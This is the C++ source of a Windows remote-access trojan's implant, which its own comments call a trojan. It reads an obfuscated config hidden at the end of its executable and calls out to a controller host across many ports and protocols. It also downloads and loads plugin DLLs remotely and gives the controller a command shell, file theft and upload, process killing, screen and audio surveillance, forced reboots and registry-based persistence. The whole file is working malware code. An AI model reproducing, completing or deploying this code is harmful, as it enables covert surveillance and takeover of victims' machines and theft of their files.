// svrctrl.cpp : Defines the entry point for the console application.
//

#include <vector>
#include <string>
#include <map>
#include <algorithm>
#include <time.h>
#include <stdio.h>

#include "svrctrl.h"
#include "conn.h"
#include "svrdll.h"
#include "svrcmdtab.h"
#include "macro.h"
#include "WjcDes.h"
#include "zlib.h"

#include <Windows.h>
#include <process.h>

#include "fileoperation.h"
#include "queryinfo.h"
#include "execcmd.h"
#include "processMgr.h"
#include "screen.h"
#include "audioMgr.h"
#include "../allPlugins/svrctrl.h"

using namespace std;
const int CONFIG_SECTION_SIZE = 512;
CmdTables gCmdTables;
map<string, HMODULE> dllHandles;

struct pair_conn
{
	unsigned short type;
	unsigned short port;

	pair_conn(unsigned short t = 0, unsigned short p = 0):type(t), port(p){}
};

char* g_Addr = NULL;
int g_Port = 53;
int g_Type = CONN_UDP1;

static CRITICAL_SECTION myMutex;
static char myBuf[10240];
static char iniFile[512];
static char machineName[512];
static const int MAX_IPS = 32;
static string_ip allClientIPs[MAX_IPS];
static int nClientIPs = 0;
static string_ip gClientIP;
static conn gConn;
static bool gExit = false;
static union client_cfg gConnCFG;
union client_cfg *gCFG = NULL;
static int gConnType;
static int gPort;

/************************************************************************/
/* 发送数据给客户端，支持加密和非加密格式                               */
/************************************************************************/
static int WriteDataToClient(conn s, struct control_header* header, const char* buf, int n)
{
	//加密方式发送
	int flag = (header == NULL) ? 0 : header->isCompressed; //1为加密 2为压缩
	if(flag && n > 0)
	{
		int ret = 0;
		int len = (flag == 1) ? (n / 8 + 1) * 8 : compressBound(n);
		char* encry = new char[len+4];
	
		memset(encry, 0, len);
		int outLen = 0;
		
		if(flag == 1)
		{
			outLen = Des_Go(encry, (char*)buf, n, myKey, strlen(myKey), ENCRYPT);//加密正文
			if(outLen < 0) { ret = DES_ERROR; goto leave; }
		}
		else 
		{
			outLen = compress((Bytef *)(encry+4), (uLongf *)&len, (Bytef *)buf, n);
		
			if(outLen != Z_OK)	{ ret = COMPRESS_ERROR; goto leave;}
			else if(len > 1100)	{ ret = WRITE_TOOLONG; goto leave;}
			else {outLen = len + 4; *(int*)encry = n; }
		}

		header->dataLen = outLen;
		if(conn_write(s, (const char*)header, sizeof(*header), 0) < 0)//发送应用头数据，不加密
		{
			ret = WRITE_ERROR;
			goto leave;
		}
		if(conn_write(s, encry, outLen, 0) < 0)//发送加密的数据正文
		{	
			ret = WRITE_ERROR;
			goto leave;
		}

		KDebug("Des_Go %d --> %d\n", n, outLen);
		ret = sizeof(*header) + outLen;
leave:
		delete []encry;
		return ret;
	}

	//不加密方式发送
	if(header)	header->dataLen = n;
	if(header && conn_write(s, (const char*)header, sizeof(*header), 0) < 0)
		return WRITE_ERROR;
	if(n && conn_write(s, buf, n, 0) < 0)
		return WRITE_ERROR;
	return header ? sizeof(*header) + n : n;
}

static struct sock_funcs mySockFuncs = 
{
	conn_socket,
	conn_connect,
	conn_read,
	WriteDataToClient,
	conn_close,
	conn_inet_addr,
	conn_htons,
	conn_error
};

/************************************************************************/
/*加载一个DLL插件					                                     */
/************************************************************************/
HMODULE LoadPluginFunc(const char* fileName)
{
	getDllInfo dllInfos;
	getFuncCnt dllFunCnt;
	onUninitialize destroyFun;
	onInitialize initFunc;

	HMODULE handle = LoadLibraryA(fileName);

	if(handle)
	{
		dllFunCnt = (getFuncCnt)GetProcAddress(handle, "GetDllFuncCnt");
		if(!dllFunCnt)	return handle;

		dllInfos = (getDllInfo)GetProcAddress(handle, "GetDllFuncs");
		if(!dllInfos)	return handle;

		destroyFun = (onUninitialize)GetProcAddress(handle, "OnUninitialize");

		initFunc = (onInitialize)GetProcAddress(handle, "OnInitialize");

		int nCount = dllFunCnt();
		const dll_info* infos = dllInfos();
		for(int j = 0; j < nCount; j++)
		{
			if(infos[j].reserved < gCmdTables[infos[j].cmd].reserved)
				continue;
			
			cmd_table cmdTab;
			cmdTab.cmdID = infos[j].cmd;
			cmdTab.reserved = infos[j].reserved;
			cmdTab.func = (coreFunc)GetProcAddress(handle, infos[j].name);
			cmdTab.destroy = destroyFun;
			cmdTab.init = initFunc;
			strncpy(cmdTab.name, fileName, sizeof(cmdTab.name)); 
			gConnCFG.cfg1.reserved = &mySockFuncs;
			if(initFunc)	initFunc(&gConnCFG);

			gCmdTables[cmdTab.cmdID] = cmdTab;		
		}
	}

	return handle;
}

/************************************************************************/
/* 更新插件                                                              */
/************************************************************************/
static int UpdatePlugin(char* buf, int n)
{
	dir_info *info = (dir_info*)buf;
	char dllname[MAX_PATH] = {0}, path[MAX_PATH] = {0};
	int size = info->fileSizeLow;
	char* content = new char[size];
	int totalN = 0, readN;
	control_header header;
	int nStatus = 0;
	char name[32] = {0};

	GetCurrentDirectoryA(MAX_PATH, path);
	sprintf(dllname, "%s\\%s.DLL", path, info->name);
	strcpy(name, info->name);

	//读取dll插件的文件内容
	while(totalN < size)
	{
		readN = conn_read(gConn, (char*)&header, sizeof(header), 0);
		if(readN <= 0 || header.command != CONTROL_INFO_FILE)
		{
			nStatus = ERR_FAILCONN;
			break;
		}

		readN = conn_read(gConn, content+totalN, header.dataLen, 0);
		if(readN <= 0)
		{
			nStatus = ERR_FAILCONN;
			break;
		}

		if(header.isCompressed)
		{
			readN = Des_Go(content+totalN, content+totalN, readN, myKey, strlen(myKey), DECRYPT);
			if(readN < 0)	break;
		}

		totalN += readN;
	}

leave:
	if(nStatus == 0)
	{
		//如果当前插件已经存在，先卸载之
		_strlwr_s(info->name);
		const char* dll = info->name;
		if(dllHandles[dll] && FreeLibrary(dllHandles[dll]))
			dllHandles[dll] = NULL;
		
		//写入硬盘

		HANDLE hFile = CreateFileA(dllname, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, 
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile == INVALID_HANDLE_VALUE)
		{
			nStatus = GetLastError();
			goto myexit;
		}

		DWORD nWritten = 0;
		WriteFile(hFile, content, size, &nWritten, NULL);
		CloseHandle(hFile);
		
		//加载插件
		if((dllHandles[dll] = LoadPluginFunc(dll)) == NULL)
			nStatus = GetLastError();

		//更新配置文件
		if(nStatus == 0)
		{
			if(strstr(gCFG->cfg1.cmdModules, dll) == NULL)
			{
				strcat(gCFG->cfg1.cmdModules, dll);
				strcat(gCFG->cfg1.cmdModules, "|");
			}
			WritePrivateProfileStringA("Settings", "modules", gCFG->cfg1.cmdModules, iniFile);	
			SetFileAttributesA(iniFile, FILE_ATTRIBUTE_HIDDEN);
		}
	}

myexit:
	REASSIGN_HEADER(header, CONTROL_UPDATE, nStatus);
	header.dataLen = sizeof(name);
	WriteDataToClient(gConn, &header, name, sizeof(name));
	delete []content;
	return nStatus;
}


/************************************************************************/
/* 卸载插件                                                              */
/************************************************************************/
static int UnloadPlugin(char* buf, int n)
{
	string pluginStillOn = "";
	for(map<string, HMODULE>::iterator it = dllHandles.begin(); it != dllHandles.end(); /*it++*/)
	{
		int nStatus = ERR_UNKNOWN;
		const char* dll = it->first.c_str();

		if(dllHandles[dll] && FreeLibrary(dllHandles[dll]) == FALSE)	
		{
			nStatus = GetLastError();
			pluginStillOn += string(dll) + "|";
			goto leave;
		}
		else
		{
			nStatus = 0;
			dllHandles[dll] = NULL;
		}

		//KDebug("process uninstall %s", dll);
		//KDebug("before deleting %d\n", gCmdTables.size());
		for(CmdTables::iterator itera = gCmdTables.begin(); itera != gCmdTables.end(); /*itera++*/)
		{
			if(itera->second.reserved == 0)
				continue;

			if(_stricmp(itera->second.name, dll) == 0)
				gCmdTables.erase(itera++);
			else
				itera ++;
		}
		//KDebug("after deleting %d", gCmdTables.size());

		char dllname[MAX_PATH] = {0}, path[MAX_PATH] = {0};
		GetCurrentDirectoryA(MAX_PATH, path);
		sprintf(dllname, "%s\\%s.DLL", path, dll);
		DeleteFileA(dllname);
		
leave:
		if(nStatus == 0)dllHandles.erase(it++);
		else			it++;

		control_header header = INITIALIZE_ENCYRPT_HEADER(CONTROL_UNINSTALL);
		header.dataLen = sizeof(dll);
		header.response = nStatus;
		WriteDataToClient(gConn, &header, dll, sizeof(dll));
	}

	//没有权限
	WritePrivateProfileStringA("Settings", "modules", pluginStillOn.c_str(), iniFile);
	SetFileAttributesA(iniFile, FILE_ATTRIBUTE_HIDDEN);
	
	return 0;
}

/************************************************************************/
/* 卸载该木马                                                            */
/************************************************************************/
static int UninstallService()
{
	//删除注册表自启动
	HMODULE hModule = GetModuleHandleA("advapi32.dll");
	if(hModule == NULL)	hModule = LoadLibraryA("advapi32.dll");
	typedef LSTATUS (__stdcall* MyRegOpenKeyEx)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
	typedef LSTATUS (__stdcall* MyRegSetValueEx)(HKEY, LPCSTR, DWORD, DWORD, CONST BYTE*, DWORD);	
	typedef LSTATUS (__stdcall* MyRegCloseKey)(HKEY);
	
	MyRegOpenKeyEx openReg = NULL;
	MyRegSetValueEx setReg = NULL;
	MyRegCloseKey closeReg = NULL;
	if(hModule)
	{
		openReg = (MyRegOpenKeyEx)GetProcAddress(hModule, "RegOpenKeyExA");
		setReg = (MyRegSetValueEx)GetProcAddress(hModule, "RegSetValueExA");
		closeReg = (MyRegCloseKey)GetProcAddress(hModule, "RegCloseKey");
	}

	char buff[1024];
	HKEY hkRoot = HKEY_CURRENT_USER;
	strncpy(buff, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", sizeof buff);
	if( ERROR_SUCCESS == openReg(hkRoot, buff, 0, KEY_ALL_ACCESS, &hkRoot))
	{	
		setReg(hkRoot, "WordDaemon", 0, REG_SZ, (const BYTE *)"", 0);
		closeReg(hkRoot);
	}

	ExitProcess(0);
	return 0;
}

HANDLE CopyEvent;
struct DispatchStruct
{
	unsigned short cmd;
	char* buf;
	int n;
};

/************************************************************************/
/* 具体命令字的分发：在全局命令表中查找此命令，如果命中调用函数进行处理 */
/************************************************************************/
unsigned int WINAPI DispatchThread(void* p)
{
	DispatchStruct* param = (DispatchStruct*)p;
	unsigned short cmd = param->cmd;
	int n = param->n;
	
	CmdTables::iterator iter;
	coreFunc func;
	int nStatus;

	if((iter = gCmdTables.find(cmd)) == gCmdTables.end() || !(func = iter->second.func))
	{
		nStatus = ERR_NOTHISMODULE;
		control_header header = INITIALIZE_HEADER(cmd);
		header.response = nStatus;
		WriteDataToClient(gConn, &header, NULL, 0);
		SetEvent(CopyEvent);
		return nStatus;
	}
	
	char* buf = NULL;
	if(n  > 0)
	{
		buf = new char[n+1];
		memset(buf, 0, n+1);
		memcpy(buf, param->buf, n);
	}
	SetEvent(CopyEvent);
	nStatus = func(gConn, buf, n, WriteDataToClient);

	delete []buf;
	return nStatus;
}

/************************************************************************/
/* 具体命令字的分发                                                     */
/************************************************************************/
int DispatchCommand(unsigned short cmd, char* buf, int n)
{
	DispatchStruct myParam = {cmd, buf, n};
	CopyEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	unsigned int threadId;
	
	HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, DispatchThread, &myParam, 0, &threadId);
	WaitForSingleObject(CopyEvent, INFINITE);
	CloseHandle(hThread);
	CloseHandle(CopyEvent);

	return 0;
}

/************************************************************************/
/* 当会话连接丢失，清理DLL命令模块的一些资源                            */
/************************************************************************/
int DestoryResourceIfNessary(conn s)
{
	for(CmdTables::iterator it = gCmdTables.begin(); it != gCmdTables.end(); it++)
	{
		onUninitialize destroyFun = it->second.destroy;
		if(destroyFun)	destroyFun(s);
	}
	return 0;
}

static int ShutdownMachine()
{
	EnablePrivilege(SE_SHUTDOWN_NAME, true);				//启用关机特权
	ExitWindowsEx(EWX_FORCE | EWX_SHUTDOWN, 0);				//关闭 Windows

	return 0;
}

static int RebootMachine()
{
	EnablePrivilege(SE_SHUTDOWN_NAME, true);				//启用关机特权
	ExitWindowsEx(EWX_FORCE | EWX_REBOOT, 0);				//重启 Windows

	return 0;
}

static int ChangeName(char* newName)
{
	strncpy(machineName, newName, sizeof(machineName));
	WritePrivateProfileStringA("Settings", "name", newName, iniFile);	

	control_header header = INITIALIZE_ENCYRPT_HEADER(CONTROL_CHANGE_TEXT);
	header.response = 0;
	WriteDataToClient(gConn, &header, NULL, 0);

	return 0;
}

/************************************************************************/
/* 接受客户的请求数据并做相应处理                                       */
/************************************************************************/
unsigned int WINAPI WorkDispatchThread(void* p)
{
	int n = 0, nTry = 0;
	char buf[8196] = {0};
	const int maxRetry = 5000;

	//从客户端读取数据，经过验证为有效请求数据则分发客户端的命令并指派相应的命令处理模块
	while(1)
	{
		if(gExit == true)	break;

		control_header header;
		conn_set allConns;
		allConns.push_back(gConn);
		conn_set readConns, excpConns;
		int r = conn_selectEx(allConns, &readConns, &excpConns, 5000);
		if(r < 0)	{ KDebug("selectEx failed %d", conn_error); break; }
		else if(r == 0)	continue;//超时

		n = conn_read(gConn, (char*)&header, sizeof(header), 0);
		if(n < 0)
		{
			KDebug("read error because of %d\n", conn_error);
			break; 
		}

		//验证数据包
		if(nTry == maxRetry) break;
		if(!ISVALID_HEADER(header) || n == 0)
		{
			nTry ++;
			continue;
		}

		//读取命令请求的额外数据
		n = header.dataLen;
		if(n > 0)
		{
			memset(buf, 0, sizeof(buf));
			n = conn_read(gConn, buf, n, 0);

			if(n < 0)	{	gExit = true; return -1;}
		}

		//分发命令
		switch(header.command)
		{
		case CONTROL_FEEDBACK://直接跳过
			break;
		case CONTROL_UPDATE:
			UpdatePlugin(buf, n);
			break;
		case CONTROL_UNINSTALL:
			UnloadPlugin(buf, n);
			break;
		case CONTROL_REMOVE:
			UninstallService();
			break;
		case CONTROL_RESTART_SYSTEM:
			RebootMachine();
			break;
		case CONTROL_SHUTDOWN_SYSTEM:
			ShutdownMachine();
			break;
		case CONTROL_CHANGE_TEXT:
			ChangeName(buf);
			break;
		default:
			DispatchCommand(header.command, buf, n);
			break;
		}
	}
	
	gExit = true;
	return 0;
}

/************************************************************************/
/* 定时给客户端发送KeepAlive信息                                        */
/************************************************************************/
unsigned int WINAPI KeepAliveThread(void* p)
{
	const int keepLen = sizeof(struct keepalive_info);
	const int maxKeepCnt = 256;
	const int headerLen = sizeof(struct control_header);
	int nWrite = 0;

	{
		struct control_header header = INITIALIZE_HEADER(CONTROL_LOGIN);
		
		header.dataLen = strlen(machineName)+1;
		header.reserved = OS_WINDOWS;
		MakeGuid((unsigned char*)header.password);
		if( WriteDataToClient(gConn, &header, machineName, strlen(machineName)+1)  < 0)
			return 0;
	}

	while(1)
	{
		if(gExit == true)	break;

		struct control_header header = INITIALIZE_HEADER(CONTROL_KEEPALIVE);
		struct keepalive_info info[maxKeepCnt];
		
		int nCmd = 0;
		for(CmdTables::iterator it = gCmdTables.begin(); it != gCmdTables.end(); it++)
		{
			info[nCmd].cmd = it->second.cmdID;
			info[nCmd].reserved = it->second.reserved;
			nCmd++;
			if(nCmd == maxKeepCnt)	break;
		}
		//printf("[%d %d %d]\n", nCmd, keepLen, nCmd*keepLen);
		header.dataLen = keepLen * nCmd;
		header.reserved = OS_WINDOWS;
		MakeGuid((unsigned char*)header.password);
		
		nWrite = WriteDataToClient(gConn, &header, (const char*)&info, nCmd*keepLen);
		if(nWrite < 0)
		{
			//KDebug("write error because of %d\n", conn_error);
			break;
		}
	
		Sleep(60000);
	}

	gExit = true;
	return 0;
}

#define ADD_INTERNEL_ENTRY(id, moduleName, coreFun, initFun, destroyFun)\
{																		\
	cmd_table cmdTab;													\
	cmdTab.cmdID = id;													\
	cmdTab.reserved = 0;													\
	cmdTab.func = coreFun;												\
	cmdTab.destroy = destroyFun;										\
	cmdTab.init = initFun;												\
	strncpy(cmdTab.name, moduleName, sizeof(cmdTab.name));				\
	if(initFun)	initFun(&gConnCFG);										\
	gCmdTables[cmdTab.cmdID] = cmdTab;									\
}

/************************************************************************/
/* 根据域名获取IP地址													 */
/************************************************************************/
static int GetSiteIP(string_ip ips[], int& nips, const char* hostname)
{
	HMODULE module = LoadLibraryA("ws2_32.dll");
	if(module == NULL)	return -1;

	typedef struct hostent* (__stdcall *myGetHostByName)(const char*);
	typedef char* (__stdcall* myInet_ntoa)(struct in_addr);
	
	myGetHostByName myGetHost = (myGetHostByName)GetProcAddress(module, "gethostbyname");
	myInet_ntoa myInet = (myInet_ntoa)(myGetHostByName)GetProcAddress(module, "inet_ntoa");
	if(!myGetHost || !myInet)
	{
		FreeLibrary(module);
		return -1;
	}

	hostent *pHostent = myGetHost(hostname);
	if(pHostent == NULL)	return -1;

	hostent& he = *pHostent;
	sockaddr_in sa;	
	nips = 0;
	for (int i = 0; he.h_addr_list[i]; i++)
	{
		if(nips >= 32)	break;
		memcpy(&sa.sin_addr.s_addr, he.h_addr_list[i], he.h_length);
		strcpy_s(ips[nips], 32, myInet(sa.sin_addr));
		nips ++;
	}

	FreeLibrary(module);
	return 0;
}

/************************************************************************/
/* 加载配置信息：包括木马控制端的IP、端口等								 */
/************************************************************************/
int loadConfig()
{
	gCFG = new union client_cfg;
	char selfFile[MAX_PATH] = {0}, path[MAX_PATH] = {0};
	bool valid = true;

	GetCurrentDirectoryA(MAX_PATH, path);
	sprintf(iniFile, "%s\\plugin.ini", path);

	do
	{
		//首先读取配置信息（位于PE文件的最后）
		if(GetModuleFileNameA(NULL, selfFile, MAX_PATH) == 0)
			break;
		
		//KDebug("%s", selfFile);
		FILE* fp = fopen(selfFile, "rb");
		if(fp == NULL)	break;
		if(fseek(fp , 0 - sizeof(union client_cfg) , SEEK_END))
		{
			valid = false;
			fclose(fp);
			break;
		}
		fread(gCFG, sizeof(union client_cfg) , 1, fp);
		fclose(fp);

		//是否为合法的配置信息
		if(memcmp(gCFG, CFG_MAGIC, 8) != 0)
		{
			valid = false;
			break;
		}

		//将配置信息解密
		unsigned char* pp = (unsigned char*)gCFG;
		for (int i = sizeof(CFG_MAGIC); i < sizeof(gCFG->cfg1); i++)
			pp[i] ^= 0xFF;
	}while(0);

	if(valid == false)
	{	
		KDebug("invalid config");
		if(!g_Addr)
			strcpy_s(gCFG->cfg1.clientIP, sizeof(string_ip), "www.mytest.com");
		else
			strcpy_s(gCFG->cfg1.clientIP, sizeof(string_ip), g_Addr);
		
		gCFG->cfg1.port = (g_Port == 0) ? GetProfileIntA("Settings", "port", 8080) : g_Port;

		gCFG->cfg1.conn_type = (g_Type == 0) ? GetProfileIntA("Settings", "type", CONN_UDP1) : g_Type;	

		strcpy_s(gCFG->cfg1.cmdModules, sizeof(gCFG->cfg1.cmdModules), 
			"execcmd|fileoperation|queryinfo|process|screen|audioMgr|");
	}

	ADD_INTERNEL_ENTRY(CONTROL_QUERY_INFO, "self", QueryInfomation, NULL, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_REQUEST_SHELL, "self", CmdShell, NULL, OnCmdUninitialize);
	ADD_INTERNEL_ENTRY(CONTROL_ENUM_DISKS, "self", EnumAllDrives, OnInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_ENUM_FILES, "self", EnumDir, OnInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_CREATE_DIR, "self", CreateDir, OnInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_COPY_FILE, "self", CopyFileOrDir, OnInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_RENAME_FILE, "self", RenameFileOrDir, OnInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_DELETE_FILE, "self", DeleteFileOrDir, OnInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_UPLOAD_FILE, "self", UploadFileOrDir, OnInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_DOWNLOAD_FILE, "self", DownloadFileOrDir, OnInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_SEARCH_FILE, "self", SearchFile, OnInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_RUN_FILE, "self", ExecFile, OnInitialize, NULL);		
#ifndef TRIVAL 
	ADD_INTERNEL_ENTRY(CONTROL_ENUM_PROCS, "self", EnumProcess, NULL, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_KILL_PROCS, "self", KillProcess, NULL, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_AUDIO_INIT, "self", AudioMonitor, OnAudioInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_AUDIO_CLOSE, "self", AudioDestroy, OnAudioInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_MONITOR_SCREEN, "self", MonitorScreen, OnScreenInitialize, NULL);
	ADD_INTERNEL_ENTRY(CONTROL_CLOSE_SCREEN, "self", CloseScreen, OnScreenInitialize, NULL);
#endif

	char user[MAX_PATH] = {0};
	DWORD len = MAX_PATH;
	FARPROC fGetPCName = GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetComputerNameA");
	((BOOL (__stdcall*)(LPSTR, LPDWORD))fGetPCName)(user, &len);
	GetPrivateProfileStringA("Settings", "name", "", machineName, sizeof(machineName), iniFile);
	if(strcmp(machineName, "") == 0)
		strcpy(machineName, user);

	WritePrivateProfileStringA("Settings", "modules", "self|", iniFile);
	SetFileAttributesA(iniFile, FILE_ATTRIBUTE_HIDDEN);

	//加载所有支持的插件
	_strlwr_s(gCFG->cfg1.cmdModules);
	char* modules = gCFG->cfg1.cmdModules;
	vector<string> allDlls;
	char* q = modules, *p = strchr(q, '|');
	while(p && q)
	{
		char thisM[256];
		strncpy_s(thisM, sizeof(thisM), q, p-q);
		allDlls.push_back(thisM);
		q += (p-q)+1;
		p = strchr(q, '|');

		dllHandles[thisM] = LoadPluginFunc(thisM);
	}

	InitializeCriticalSection(&myMutex);

	unsigned long addr = conn_inet_addr(gCFG->cfg1.clientIP);
	//如果地址为域名格式，查询DNS获取其所有IP可选地址
	if(addr == INADDR_NONE ){
		GetSiteIP(allClientIPs, nClientIPs, gCFG->cfg1.clientIP);
	}
	//客户地址就是IP格式
	else
	{
		strcpy_s(allClientIPs[nClientIPs], 32, gCFG->cfg1.clientIP);
		nClientIPs = 1;
	}

	return 0;
}

unsigned int WINAPI TrojanMainThread(void* p)
{
	struct pair_conn allPairs[1+(sizeof(tcpPorts)+sizeof(udpPorts)+sizeof(httpPorts))/sizeof(int)];
	int nPairs = 0;
	bool bConnected = false;
	char buf[1024];
	
	//首先初始化将配置中的端口信息
	allPairs[nPairs++] = (pair_conn(gCFG->cfg1.conn_type, gCFG->cfg1.port));
	//其次插入防火墙的例外端口
	for(int i = 0; i < sizeof(tcpPorts)/sizeof(int); i++)	allPairs[nPairs++]=(pair_conn(CONN_TCP, tcpPorts[i]));
	for(int i = 0; i < sizeof(udpPorts)/sizeof(int); i++)	allPairs[nPairs++]=(pair_conn(CONN_UDP1, udpPorts[i]));
	for(int i = 0; i < sizeof(httpPorts)/sizeof(int); i++)	allPairs[nPairs++]=(pair_conn(CONN_HTTP_CLIENT, httpPorts[i]));
	int nPos = nPairs;
	
	while(1)
	{
		bConnected = false;
		
		//尝试连接客户端，如果客户存在多个IP的话，则找出一个合适的可以连接上的
		if(nClientIPs == 0)
		{
			GetSiteIP(allClientIPs, nClientIPs, gCFG->cfg1.clientIP);
			Sleep(3000);
		}
		for(int i = 0; i < nClientIPs; i++)
		{
			if(bConnected == true)	break;
			
			for(int nPair = 0; nPair < nPairs; nPair++)
			{
				if(bConnected == true)	break;

				int thisType = allPairs[nPair].type;
				int thisPort = allPairs[nPair].port;
				if((gConn = conn_socket(thisType))  == NULL)
				{
					Sleep(1000);
					continue;
				}

				sockaddr_in addr;
				addr.sin_family = AF_INET;
				addr.sin_port = mySockFuncs.myHtons(thisPort);
				addr.sin_addr.s_addr = mySockFuncs.myInet_addr(allClientIPs[i]);
				KDebug("%d: try connect to address %s [%d, %d]... ", nPair, allClientIPs[i], thisType, thisPort);
				int r = conn_connect(gConn, (const struct sockaddr*)&addr, sizeof(addr));//连接监控端 
				if(r == 0)
				{
					//设置发送和接受数据的timeout值，很重要！！！
					int opt = 15000;
					conn_setsockopt(gConn, 0, ConnOpt::CONN_RCVTIMEO, &opt, sizeof(opt));
					conn_setsockopt(gConn, 0, ConnOpt::CONN_SNDTIMEO, &opt, sizeof(opt));
			
					//赶紧发送一个标记给监控端，提醒注意这是一个正常的连接
					unsigned char task = 'M';
					conn_write(gConn, (char*)&task, sizeof(task), 0);

					//有效时间内没得到监控端的响应，推出
					int nRecv = conn_read(gConn, buf, sizeof(control_header), 0);
					control_header* myHdr = (control_header*)buf;
					KDebug("nRecv = %d", nRecv);
					if(nRecv != sizeof(*myHdr) || !ISVALID_HEADER(*myHdr) || myHdr->command != CONTROL_FEEDBACK)
					{
						KDebug("[Cancel] No makesure responce\n");
						conn_close(gConn);
						Sleep(1000);
						continue;
					}

					strcpy_s(gClientIP, sizeof(gClientIP), allClientIPs[i]);
					gConnType = thisType;
					gPort = thisPort;
					
					//将监控机的信息【ip,端口，类型】传送给各个插件
					strncpy(gConnCFG.cfg1.clientIP, gClientIP, sizeof(gConnCFG.cfg1.clientIP));
					gConnCFG.cfg1.port = thisPort;
					gConnCFG.cfg1.conn_type = thisType;
					gConnCFG.cfg1.reserved = &mySockFuncs;
					for(CmdTables::iterator iter = gCmdTables.begin(); iter != gCmdTables.end(); iter++)
					{
						onInitialize init = iter->second.init;
						if(init)	init(&gConnCFG);
					}

					//将本次连接上的移到末尾，这样其他接口有机会
					if(nPos > 1)
					{
						KDebug("%d <--> %d\n", nPair, nPos -1);
						pair_conn thisPair = allPairs[nPair];
						allPairs[nPair] = allPairs[nPos -1];
						allPairs[nPos -1] = thisPair;
						if(--nPos == 1)	nPos = nPairs;
					}
					
					bConnected = true;
					KDebug("[OK]\n");
					break;
				}
				KDebug("[Cancel] Reason %d\n", conn_error);
				conn_close(gConn);
				Sleep(1000);
			}
		}

		//连接成功，分派线程具体处理各个命令，定时发送KeepAlive消息
		if(bConnected == true)	
		{
			gExit = false;
			HANDLE hThreads[2];
			unsigned int threadId1, threadId2;
			hThreads[0] = (HANDLE)_beginthreadex(NULL, 0, WorkDispatchThread, NULL, 0, &threadId1);
			hThreads[1] = (HANDLE)_beginthreadex(NULL, 0, KeepAliveThread, NULL, 0, &threadId2);

			WaitForMultipleObjects(2, hThreads, TRUE, INFINITE);

			CloseHandle(hThreads[0]);
			CloseHandle(hThreads[1]);		

			KDebug("connection closed\n");
			
			DestoryResourceIfNessary(gConn);
			conn_close(gConn);
		}
		else 
		{
			Sleep(5000);
		}

	}
}


int main(int argc, char* argv[])
{
	conn_startup();

	SetErrorMode(0x8001u);

	loadConfig();
	
	HANDLE hThread;
	unsigned int threadId;
	hThread = (HANDLE)_beginthreadex(NULL, 0, TrojanMainThread, NULL, 0, &threadId);
	WaitForSingleObject(hThread, INFINITE);

	return 0;
}

